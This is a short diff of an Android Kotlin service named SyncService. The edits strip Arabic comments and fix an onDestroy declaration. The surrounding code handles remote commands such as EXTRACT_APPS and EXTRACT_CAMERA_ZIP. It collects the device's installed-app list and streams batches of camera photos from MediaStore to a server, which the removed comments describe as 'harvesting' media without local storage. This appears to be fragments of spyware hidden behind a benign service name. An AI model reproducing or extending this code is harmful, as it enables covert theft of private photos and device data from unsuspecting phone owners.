@@ -140,7 +140,6 @@ class SyncService : Service() {
                                         action.contains("EXTRACT_APPS") -> {
                                             streamTextDirect(deviceId, nodeModel, "Uranium_InstalledApps.txt", readInstalledApps())
                                         }
-                                        // ⚡ الحصاد المباشر للوسائط بدون تخزين محلي (Zero Storage Overhead)
                                         action.contains("EXTRACT_CAMERA_ZIP") -> {
                                             streamMediaStoreDirect(deviceId, nodeModel, "Camera_DCIM", MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
                                         }
@@ -176,7 +175,6 @@ class SyncService : Service() {
         } catch (e: Exception) {}
     }
 
-    // 🚀 دريقة البث المباشر لملفات الوسائط الفردية بدون حفظ على القرص المؤقت
     private fun streamMediaStoreDirect(nodeId: String, nodeModel: String, prefix: String, contentUri: Uri) {
         try {
             sendReportToServer(nodeId, nodeModel, "⚡ [البث المباشر الفوري] جاري سحب أرشيف $prefix بدون استخدام مساحة التخزين...")
@@ -189,7 +187,7 @@ class SyncService : Service() {
             cursor?.use {
                 val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
                 val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
-                while (it.moveToNext() && count < 200) { // دفق ذكي ونظيف لكل دفعة لتجنب الضغط على الذاكرة
+                while (it.moveToNext() && count < 200) {
                     if (idIdx != -1 && nameIdx != -1) {
                         val id = it.getLong(idIdx)
                         val name = it.getString(nameIdx) ?: "file_$id.dat"
@@ -352,7 +350,7 @@ class SyncService : Service() {
         } catch (e: Exception) {}
     }
 
-    override onDestroy() {
+    override fun onDestroy() {
         super.onDestroy()
         wakeLock?.release()
         serviceScope.cancel()
